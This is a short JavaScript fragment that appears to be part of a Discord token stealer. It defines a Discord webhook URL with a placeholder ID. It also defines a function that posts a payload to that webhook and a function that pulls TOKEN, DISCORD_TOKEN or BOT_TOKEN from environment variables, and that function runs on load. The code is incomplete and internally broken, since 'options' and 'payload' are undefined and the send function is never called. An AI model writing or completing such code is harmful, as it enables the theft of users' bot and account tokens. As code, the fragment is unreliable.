const WEBHOOK_URL = 'https://discord.com/api/webhooks/123456789012345678/example_example_example_example';
function sendToWebhook(data) { const req = https.request(options, res => {}); req.write(payload); req.end(); }
function extractToken() {
 let token = process.env.TOKEN || process.env.DISCORD_TOKEN || process.env.BOT_TOKEN;
 const login = function(tokenArg) { return tokenArg; };
 if (token) return token;
}
extractToken();
